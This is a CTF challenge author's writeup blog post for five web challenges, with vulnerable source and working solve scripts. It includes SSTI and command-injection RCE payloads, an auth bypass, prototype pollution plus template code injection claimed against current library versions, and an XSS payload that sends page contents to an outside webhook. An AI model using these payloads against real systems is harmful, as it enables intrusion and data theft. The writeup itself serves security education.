---
title: "SCTF 7.0 Quals Webs"
date: 2026-06-28
summary: "writeups for web challs i set for sctf 7.0 quals"
tags: ["sctf", "ctf", "web"]
---

## Introduction  

SCTF 7.0 recently concluded this week, and over the past few months, I have been writing web challenges in preparation.  

Below are writeups for the web challs I set for the online qualifiers.  

## bebeh ssti  

<img src="/blog/sctf-quals-web/images/bebeh_ssti.png" width=600>

This is a fairly straightforward SSTI challenge meant as free points for contestants.  

The flag file is added to the root directory.  

```dockerfile
FROM python:3.10-slim

WORKDIR /app
COPY . .

RUN pip install flask

RUN mv /app/flag.txt /flag.txt

EXPOSE 5000

CMD ["python", "app.py"]
```

User-supplied input is checked against a blacklist, then injected into a template string to be rendered.  

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

banned = [
    "'", "\"",
    'self', 'cycler', 'globals', 'builtins',
    'os', 'system', 'popen', 'sh', 'cat'
]

@app.route("/")
def index():
    name = request.args.get("name") or "anonymous"
    name = f'Hello {name}'

    for bad in banned:
        if bad in name.lower():
            name = f"Banned: {bad}"
            break

    return render_template_string(f"""
<!DOCTYPE html>
<html>
<head>
    <title>Greeting Box</title>
    <style>
        * {{
            box-sizing: border-box;
        }}

        body {{
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            color: #eaeaea;

            background: url("{{{{ url_for('static', filename='bebeh.jpg') }}}}") no-repeat center center fixed;
            background-size: cover;
        }}

        .box {{
            width: 400px;
            max-width: 90%;
            padding: 20px;
            border-radius: 12px;
            background: rgba(21, 24, 34, 0.9);
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            backdrop-filter: blur(6px);
        }}

        input {{
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            outline: none;
            background: #1f2330;
            color: white;
            display: block;
        }}

        button {{
            width: 100%;
            margin-top: 10px;
            padding: 10px;
            border: none;
            border-radius: 8px;
            background: #4c7dff;
            color: white;
            cursor: pointer;
        }}

        .output {{
            margin-top: 15px;
            padding: 12px;
            background: rgba(0,0,0,0.4);
            border-radius: 8px;
            min-height: 40px;
            word-break: break-word;
            font-family: monospace;
        }}
    </style>
</head>
<body>
    <div class="box">
        <form method="GET">
            <input type="text" name="name" placeholder="Enter your name">
            <button type="submit">Generate Greeting</button>
        </form>

        <div class="output">
            {name}
        </div>
    </div>
</body>
</html>
""")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
```

The blacklist blocks quotes, but this can be bypassed by passing banned keywords through request headers. From there onwards, it's just standard SSTI RCE.  

```python
import requests
import re

url = "http://localhost:6767"

payload = """
{% set a = url_for | attr(request.headers.g) %}
{% set a = a[request.headers.o] | attr(request.headers.p) %}
{{a(request.headers.c).read()}}
""".strip()

cmd = 'cat /flag.txt'

res = requests.get(f'{url}', headers={
    'g': '__globals__',
    'o': 'os',
    'p': 'popen',
    'c': cmd
}, params={
    'name': payload
})

flag = re.findall(r'(sctf{.+?})', res.text)[0].strip()
print("Flag:", flag)
```

Flag: `sctf{h3s_ju5t_4_bebeh}`

## pinger  

<img src="/blog/sctf-quals-web/images/pinger.png" width=600>

This challenge involves a minimal Node.js server with an obvious command injection vuln.  

The Dockerfile shows the flag being added in the same directory as the server source.  

```Dockerfile
FROM node:18-alpine

ENV PORT=8000

WORKDIR /app

COPY package.json ./
RUN npm install --no-package-lock

COPY . .

RUN addgroup -g 1001 -S nodejs
RUN adduser -S nodejs -u 1001
USER nodejs

EXPOSE $PORT

CMD ["node", "app.js"]
```

In `/`, user input is directly injected into the `ping` command being run. The main caveat is that payloads are checked against a highly restrictive filter, which practically eliminates all conventional command injection techniques.  

```js
const express = require("express");
const { exec } = require("child_process");

const app = express();
const PORT = process.env.PORT || 8000;

app.set("view engine", "ejs");

app.get("/", (req, res) => {
  const { url } = req.query;

  if (!url) {
    return res.render("index", { output: null, error: null });
  }

  for (const c of ";()`|&$ \t\n\r") {
    if (url.includes(c)) {
        return res.render("index", { output: null, error: "Contraband detected!" })
    }
  }

  exec(`ping -c 1 -W 2 ${url}`, (error, stdout, stderr) => {
    if (error) {
      return res.render("index", { output: null, error: stderr || error.message });
    }

    res.render("index", { output: stdout, error: null });
  });
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
```

However, if we inspect `package.json`, we will notice that `express@5.1.2` is installed.  

Express.js versions `5.*` use the `querystring` module for parsing URL parameters, and supports list syntax.  

```json
{
  "name": "pinger",
  "version": "1.0.0",
  "main": "app.js",
  "scripts": {
    "start": "node app.js"
  },
  "dependencies": {
    "express": "^5.1.2",
    "ejs": "^3.1.10"
  }
}
```

If we pass our payload as a list, the `.includes()` check for the blacklist will fail, allowing us to bypass the filter and read the flag file.  

```
?url=&url=;cat flag.txt
```

Flag: `sctf{f3ll_f0r_tHe_h3si}`

## CP Store  

<img src="/blog/sctf-quals-web/images/cp_store.png" width=600>

This chall involves a shopping page that stores user accounts and items with MySQL. The server also has a discount voucher system, but more on that later.  

The flag is a purchasable item that costs `$1000`, but user account balances are set to `$100`.  

```sql
DROP DATABASE IF EXISTS cp_db;
CREATE DATABASE cp_db;
USE cp_db;

DROP TABLE IF EXISTS users;

CREATE TABLE users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username TEXT,
  password TEXT,

  balance INT DEFAULT 100
);

INSERT INTO users (username, password) VALUES ('techie_ernie67', MD5(RAND()));

CREATE TABLE items (
  id INT AUTO_INCREMENT PRIMARY KEY,
  name TEXT,
  description TEXT,
  price INT,
  secret TEXT DEFAULT NULL
);

INSERT INTO items (name, description, price, secret) VALUES 
  ('CTFdex', 'Codex CTF Solver', 10, NULL),
  ('GPAssist', 'Retrieval Augmented Generation tool for H1 General Paper', 100, NULL),
  ('vtok', 'Extract your favourite VCT clips from matches', 50, NULL),
  ('epsteinify', 'low yuze', 67, NULL),
  ('robotic screw removal', 'Robotic system for automated screw extraction in e-waste recycling', 90, NULL);

INSERT INTO items (name, description, price, secret) VALUES ('FLAG', 'ONLY FOR TRUE CP ENJOYERS', 1000.00, 'sctf{fake_flag}');

CREATE TABLE cart (
  id INT AUTO_INCREMENT PRIMARY KEY,
  user_id INT NOT NULL,
  item_id INT NOT NULL,

  FOREIGN KEY (user_id) REFERENCES users(id),
  FOREIGN KEY (item_id) REFERENCES items(id)
);

CREATE TABLE inventory (
  id INT AUTO_INCREMENT PRIMARY KEY,
  user_id INT NOT NULL,
  item_id INT NOT NULL,

  FOREIGN KEY (user_id) REFERENCES users(id),
  FOREIGN KEY (item_id) REFERENCES items(id)
);

CREATE TABLE issued_tokens (
  id INT AUTO_INCREMENT PRIMARY KEY,
  token TEXT
);
```

The first obstacle is that the server doesn't have a registration endpoint, and the `techie_ernie_67` account has a randomised password.  

Since `/login` handles logins with prepared statements, we can't just simply use SQLi to bypass authentication.  

```js
const express = require("express");
const db = require("../db");

const router = express.Router();

router.get("/login", (req, res) => {
  res.render("login");
});

router.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.render("login", {
      error: "Missing email or password",
    });
  }

  const [rows] = await db.query(
    "SELECT * FROM users WHERE username = ? and password = ? LIMIT 1",
    [username, password]
  );

  if (rows.length === 0) {
    return res.render("login", { error: "Invalid credentials" });
  }

  const user = rows[0];

  req.session.user = {
    id: user.id,
    username: user.username,
  };

  res.redirect("/store");
});

router.get("/logout", (req, res) => {
  delete req.session.user;
  res.redirect("/login");
});

module.exports = router;
```

Looking at `package.json`, we find that the backend uses `mysql2` to handle the MySQL database.  

```json
{
    "name": "cp-store",
    "version": "1.0.0",
    "dependencies": {
        "express": "4.21.1",
        "express-session": "1.17.3",
        "ejs": "3.1.10",
        "jsonwebtoken": "9.0.2",
        "mysql2": "3.11.3"
    }
}
```

[This article](https://flatt.tech/research/posts/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql/) details that the specific versions of the `mysqljs` library has a parsing bug where inserting JavaScript objects into prepared statements can lead to unintended behaviour.  

We can leverage this to get an auth bypass.  

```js
// SELECT * FROM users WHERE username='techie_ernie_67' AND password=`password`=1
{
    'username': 'techie_ernie_67',
    'password[password]': 1
}
```

The next stage of this chall involves exploiting the discount system to purchase the flag.  

Every user account comes with a 10% discount voucher that can be claimed in `/voucher/issue`. The vouchers are JWT tokens signed with a cryptographically secure secret key.  

However, the discount applied by each voucher is not large enough to allow us to purchase the flag.  

```js
const jwt = require("jsonwebtoken");
const crypto = require('crypto');

const SECRET_KEY = crypto.randomBytes(16).toString('hex');

function generateVoucher(username) {
  return jwt.sign({
    username,
    'discount': 0.1
  }, SECRET_KEY, { 'algorithm': 'HS256' })
}

function verifyVoucher(voucher) {
  try {
    const decoded = jwt.verify(voucher, SECRET_KEY, {
      algorithms: ['HS256']
    });

    return decoded;
  } catch (err) {
    return null;
  }
}

module.exports = {
  generateVoucher,
  verifyVoucher
};
```

Looking at the voucher system source, we can spot a mismatch that would allow us to get unlimited uses on our voucher.  

`/voucher/issue` first runs `voucher in req.session.vouchers` to check if the supplied voucher has previously been used, then executes `SELECT token FROM issued_tokens WHERE token = ?` to ensure that it is indeed a previously issued token.  

MySQL ignores null bytes when performing string comparisons, which means if we pad our token with null bytes, the JavaScript check passes, while the MySQL query fetches the correct token.  

```js
const express = require("express");
const db = require("../db");
const checkAuth = require("../middleware/auth");
const { generateVoucher, verifyVoucher } = require("../voucher");

const router = express.Router();

router.get("/voucher/issue", checkAuth, async (req, res) => {
  const voucher = generateVoucher(req.session.user.username);

  await db.query(
    "INSERT INTO issued_tokens (token) VALUES (?)",
    [voucher]
  );

  res.render('voucher', { voucher });
});

router.post("/voucher/apply", checkAuth, async (req, res) => {
  const { voucher } = req.body;

  if (!req.session.vouchers) {
    req.session.vouchers = {};
  } 
  else if (voucher in req.session.vouchers) {
    return res.status(500).json({ error: "Already used voucher" });
  }

  const [rows] = await db.query(
    "SELECT token FROM issued_tokens WHERE token = ?",
    [voucher]
  );

  if (rows.length === 0) {
    return res.status(500).json({ error: "Invalid voucher" });
  }

  const payload = verifyVoucher(rows[0].token);

  if (!payload) {
    return res.status(500).json({ error: "Invalid voucher" });
  }

  req.session.vouchers[voucher] = payload.discount;

  res.json({ message: "Voucher applied" });
});

module.exports = router;
```

Below is a solve script that first performs the auth bypass, then exploits the parser mismatch to get a 100% discount on the flag item.  

```python
import requests
import re

url = "http://localhost:5000"
s = requests.Session()

# auth bypass
res = s.post(f"{url}/login", data={
    'username': 'techie_ernie67',
    'password[password]': 1
})

assert 'loadcart' in res.text.lower()
print("> Logged in")

# get voucher
res = s.get(f'{url}/voucher/issue')

voucher = re.findall(r'voucher">(.+)</div>', res.text)[0].strip()

print("> Voucher:", voucher)

# reuse token
res = s.post(f'{url}/cart/add', data={
    'item_id': 6
})

for i in range(10):
    res = s.post(f"{url}/voucher/apply", data={
        'voucher': voucher + '\x00' * i
    })

res = s.post(f"{url}/cart/checkout")

assert res.status_code == 200
print("> Bought flag")

res = s.get(f'{url}/inventory')

flag = re.findall(r'(sctf{.+?})', res.text)[0].strip()
print("> Flag:", flag)
```

An important thing to note is that this chall had a couple of issues which significalty lowered the difficulty level.  

The first issue is that I forgot `jwt.js` generates JWT tokens with a default `iat` claim, which meant separate visits to `/voucher/issue` always generated a new discount voucher, completely eliminating the need for the null-byte padding exploit.  

The second issue is that I forgot to instance the chall, which meant that the first solve would immediately expose the flag to subseqent contestants in the `/inventory` page.  

I guess my main takeaway from this chall is to always QC properly when chall setting.  

Flag: `sctf{h1_iM_3rn13_But_y0u_c4n_c4LL_M3_t3chiE_3rNie}`

## today  

<img src="/blog/sctf-quals-web/images/today.png" width=600>

The Node.js server renders the webpage using the latest version of `Squirrelly.js`, and users can specify template rendering options through URL parameters.  

Users must authenticate by passing in the username and password through URL parameters, which are parsed using `unflatten()` from `uni-flatten.js`.  

```js
const express = require("express");
const crypto = require('crypto');
const Sqrl = require("squirrelly");
const { unflatten } = require("uni-flatten");

const app = express();
const PORT = process.env.PORT || 3000;

app.engine("sqrl", Sqrl.__express);
app.set("view engine", "sqrl")
app.set("views", "./views")

const users = {
  'admin': crypto.randomBytes(32).toString('hex')
};

app.get("/", (req, res) => {
  const { username, password } = unflatten(req.query);

  if (users[username] === undefined || users[username] != password) {
    return res.status(500).json({ 'error': 'Invalid credentials' });
  }
  
  return res.render('index', req.query);
});

app.listen(PORT, () => {
  console.log(`Server running on http://127.0.0.1:${PORT}`);
});
```

The name "today" was meant to be a pun on "two zero-days". In `package.json`, the latest versions of `squirrelly` and `uni-flatten` are installed, and contestants were meant to find 0 days inside both libraries.  

```json
{
  "name": "today",
  "version": "1.0.0",
  "dependencies": {
    "express": "5.2.1",
    "squirrelly": "9.1.0",
    "uni-flatten": "1.7.1"
  }
}
```

The authentication check can potentially be bypassed through prototype pollution, and prototype pollution vulns aren't uncommon in libraries that handle object merging.  

However, if we check `src/deep-set.ts` in the `uni-flatten` source, we will notice that keys in parsed objects are checked against a `RESTRICTED_KEYS` filter, which blacklists all traversal syntax.  

This filter didn't originally exist, but I managed to get the maintainer to introduce this patch before quals just to make it slightly more difficult for contestants.  

```ts
import {
  CLASS_MAPPING_SYMBOL,
  extractCircularKey,
  extractCircularValue,
  isObject,
  mergeConfig,
  parsePath,
  SPECIAL_CHARACTER_REGEX,
} from './internal';
import { UniFlattenOptions } from './type';

export const RESTRICTED_KEYS = ['__proto__', 'constructor', 'prototype'];

/**
 * Deeply set value by key. This method mutates the original object.
 *
 * @example
 *
 * deepSet({}, "a.b", 1) // { a: { b: 1 } }
 * deepGet({}, "a.b.0", 1) // { a: { b: [1] } }
 * deepGet({}, 'a["?"][0]', 1) // { a: { '?': [1] } }
 */
export const deepSet = <T extends Record<string, unknown>>(
  obj: T,
  path: string,
  value: unknown,
  options?: UniFlattenOptions,
) => {
  if (!isObject(obj)) return obj;

  const config = mergeConfig(options);
  const keys = parsePath(path, config.strict);
  const classMapping = (obj as any)[CLASS_MAPPING_SYMBOL];
  const lastIndex = keys.length - 1;
  const serializer = options?.serializeFlattenKey || config.serializeFlattenKey;

  let current: any = obj;
  let currentKey = '';

  keys.forEach((key, i, arr) => {
    // proto pollution
    if (typeof key === 'string' && RESTRICTED_KEYS.includes(key)) {
      throw new Error(`Access to restricted key "${key}" blocked!`);
    }

    const isNextArray = typeof arr[i + 1] === 'number';
    const keyString = String(key);
    const hasSpecialCharacters = SPECIAL_CHARACTER_REGEX.test(keyString);
    currentKey = serializer(keyString, currentKey, {
      isArrayIndex: isNextArray,
      hasSpecialCharacters,
      canUseDotNotation:
        !hasSpecialCharacters && !/^\d/.test(keyString) && key !== '',
    });
    if (!isObject(current[key])) {
      const defaultObject = (
        typeof classMapping?.[currentKey] === 'function'
          ? new classMapping[currentKey]()
          : {}
      ) as any;
      current[key] = isNextArray ? [] : defaultObject;
    }
    if (i === lastIndex) {
      const circularKey = extractCircularKey(value, config.circularReference);
      current[key] =
        circularKey === undefined
          ? value
          : extractCircularValue(obj, circularKey);
    }

    current = current[key];
  });

  return obj;
};
```

We might notice that `uni-flatten` also supports syntax for resolving circular references in object values, as seen in the `extractCircularKey()` and `extractCircularValue()` functions.  

Since object values aren't being checked against the filter, we can abuse this to gain prototype pollution.  

An important thing to note is that `uni-flatten` resolves all normal keys before resolving circular references. In the POC below, we first declare property `x` with our pollution value `1337`, then use the circular reference syntax to set property `p` to be a reference to the `__proto__` property. After that we can add a polluted property `polluted` with our pollution value from earlier using the circular reference resolution again.  

```js
const { unflatten } = require('uni-flatten');

unflatten({
  'x': 1337,
  'p': '[Circular->"__proto__"]',
  'p.polluted': '[Circular->"x"]'
});

console.log(({}).polluted); // 1337
```

Applying this to the challenge context gives us this auth bypass payload.  

```js
{

    'username': 'hacker',
    'password': 'a',
    'hacker': 'a',
    'p': '[Circular->"__proto__"]',
    'p.hacker': '[Circular->"hacker"]'
}
```

The next step is getting RCE since the flag file isn't referenced anywhere in the server source.  

Inside the `squirrelly` source, we will find that the `defaultFilter` template option is directly injected into the generated template code, and no validation is done against it.  

```js
if (env.defaultFilter) {
    content = "c.l('F','" + env.defaultFilter + "')(" + content + ')';
}
```

We can set `defaultFilter` to a code injection payload that gives us RCE and reads the flag file.  

```python
import requests

url = 'http://127.0.0.1:3000'
s = requests.Session()

res = s.get(url, params={
    'defaultFilter': "e')(process.mainModule.require('child_process').execSync('cat flag.txt').toString()));if(cb){cb(null,tR)} return tR//",

    'username': 'hacker',
    'password': 'a',
    'hacker': 'a',
    'p': '[Circular->"__proto__"]',
    'p.hacker': '[Circular->"hacker"]'
})

print(res.text)
```

As an additional note, there is a simpler way to bypass the auth check by abusing JavaScript type coercion, as I accidentally used a loose comparison rather than a strict one in the auth check.  

One of the contestants used the payload below which got the server to compare the `__proto__` property against the string `"[object Object]"`, which passed due to the loose comparison. Fair play.  

```js
{
    'username': '__proto__',
    'password': '[object Object]'
}
```

Flag: `sctf{wh4t_c0m3s_Aft3R_t0d4y???THr33d4y!!!}`

## average memo xss challenge  

<img src="/blog/sctf-quals-web/images/memo_xss.png" width=600>

This was meant to be one of the harder challenges to sieve out finalists.  

The chall flow follows a typical XSS challenge. User-supplied input is rendered in `/memo`, and the `/report` endpoint renders the payload and visits the webpage with an admin bot.  

```python
from flask import Flask, render_template, request, redirect, url_for, make_response
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os
from time import sleep

app = Flask(__name__)
app.secret_key = os.urandom(32).hex()

with open("flag.txt", "r") as f:
    FLAG = f.read().strip()

users = {
    'admin': os.urandom(16).hex()
}

@app.route('/')
def index():
    if 'user' not in request.cookies:
        return redirect(url_for('login'))
    
    return redirect(url_for('profile'))

@app.get('/profile')
def profile():
    print(request.cookies, flush=True)  

    if 'user' not in request.cookies:
        return redirect(url_for('login'))

    return render_template('profile.html', user=request.cookies.get('user'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        if not username or not password:
            return render_template('register.html', error="Invalid input!")

        if username in users:
            return render_template('register.html', error='User already exists!')

        users[username] = password

        return redirect(url_for('login'))
    
    return render_template('register.html')

@app.route("/login", methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        if not username or not password:
            return render_template('login.html', error="Invalid input!")
        
        if username not in users or users[username] != password:
            return render_template('login.html', error="Invalid credentials!")
        
        resp = make_response(redirect(url_for('profile')))
        resp.set_cookie('user', username)

        return resp

    return render_template('login.html')

@app.route('/memo')
def memo():
    if 'user' not in request.cookies:
        return redirect(url_for('login'))

    isAdmin = request.remote_addr == '127.0.0.1' and request.cookies.get('user') == 'admin'

    return render_template("memo.html", admin=isAdmin)

@app.route('/check', methods=['GET'])
def check():
    content = request.args.get('content', '')

    tags = BeautifulSoup(content, 'html.parser').find_all()
    
    if len(tags) > 0:
        return '[REDACTED]'
    else:
        return content
    
@app.route("/report", methods=['GET', 'POST'])
def report():
    if 'user' not in request.cookies:
        return redirect(url_for('login'))

    if request.method == 'POST':
        url = request.form.get('url', '')

        if not url.startswith("/memo?content="):
            return render_template('report.html', status='fail', message='Invalid URL')

        options = Options()
        for arg in [
            "--headless",
            "--disable-gpu",
            "--no-sandbox",
            "--disable-dev-shm-usage"
        ]:
            options.add_argument(arg)

        try:
            base = 'http://127.0.0.1:5000'
            driver = webdriver.Chrome(options=options)

            driver.get(f"{base}/login")

            driver.find_element(By.NAME, 'username').send_keys('admin')
            driver.find_element(By.NAME, 'password').send_keys(users['admin'])
            driver.find_element(By.TAG_NAME, "form").submit()

            driver.add_cookie({
                "name": "flag",
                "value": FLAG,
                "path": "/",
                "httpOnly": True,
            })

            driver.get(f"{base}/{url}")
            sleep(3)

            driver.quit()
        except Exception as e:
            return render_template('report.html', status='fail', message=f'Error: {e}')

        return render_template('report.html', status='success', message='Report sent to admin!')

    return render_template("report.html")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=3000)
```

The first problem is that payloads are parsed using `BeautifulSoup`, and are rejected if any HTML tags are detected.  

The next problem is that the flag cookie in the admin bot is set to `httpOnly`, which means we can't simply exfiltrate it using `document.cookie`.  

The last problem is the client-side protection in `memo.html`, which sanitises the memo content with `DOMPurify` if the `window.SETTINGS.DEBUG` flag is not set.  

```html
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.1.6/dist/purify.min.js"></script>

<script>
    const params = new URLSearchParams(window.location.search);
    const content = params.get('content') || "";

    document.getElementById("content").innerHTML = DOMPurify.sanitize(content);

    window.SETTINGS = window.SETTINGS || {
        'DEBUG': false
    };

    {% if admin %}
    try {
        fetch(`/check?content=${encodeURIComponent(content)}`)
            .then(res => res.text())
            .then(data => {
                const sanitized = window.SETTINGS.DEBUG ? data : DOMPurify.sanitize(data);
                document.getElementById('content').innerHTML = sanitized;
            });
    } catch (e) {
        console.log(e);
    }
    {% endif %}
</script>
```

The `BeautifulSoup` protection can be bypassed with a simple HTML comment trick.    

```html
<!--><img src=x onerror=alert(1)>-->
```

As for the client-side protection, we can use DOM clobbering to overwrite `window.SETTINGS.DEBUG`, blocking the `DOMPurify` call.  

```html
<!--><form id="SETTINGS"><input id="DEBUG">-->
``` 

The final obstacle to overcome is the `httpOnly` flag cookie. For exfiltrating `httpOnly` cookies, we usually need an endpoint that reflects the cookie.  

The `/profile` endpoint is our best candidate, but only the `user` cookie used for authentication is rendered.  

```python
@app.get('/profile')
def profile():
    print(request.cookies, flush=True)  

    if 'user' not in request.cookies:
        return redirect(url_for('login'))

    return render_template('profile.html', user=request.cookies.get('user'))
```

To leak the flag cookie, we need to exploit the Werkzeug cookie parser.  

Werkzeug sorts cookies by the length of their path, then by the time they were added.  

We can abuse this and get Werkzeug to mess up the cookie boundaries during parsing, which will leak the flag cookie into the `user` cookie.  

```js
document.cookie='user=";path=/profile';
document.cookie='";';   // user="; user=admin; flag=sctf{flag}; ";
```

After that we can just exfiltrate the entire page content in `/profile` to a webhook, which will contain the flag.  

```python
import requests
from urllib.parse import quote

url = "http://localhost:3000"
s = requests.Session()

# login
creds = {
    'username': 'hacked',
    'password': 'hacked'
}

res = s.post(f'{url}/register', data=creds)
res = s.post(f'{url}/login', data=creds)

print("> Logged in")

# xss
webhook = 'https://arwepao.request.dreamhack.games'

js = '''
document.cookie='user=";path=/profile';
document.cookie='";';
(async function (){
    r=await fetch("/profile");
    d=await r.text();
    fetch('%s',{method:'POST',body:JSON.stringify({'e':encodeURIComponent(d)})})
})()
'''.strip().replace('\n', '').replace(' ', '/**/') % webhook

payload = f'<!--><form id="SETTINGS"><input id="DEBUG"><img src=x onerror={js}>-->'

res = s.post(f'{url}/report', data={
    'url': f'/memo?content={quote(payload)}'
})

if "sent to" in res.text.lower():
    print("> Payload submitted")
```

Flag: `sctf{y0uv3_h34rD_4b0uT_x55_n0w_it5_t1me_f0r_xss2.0!!!}`  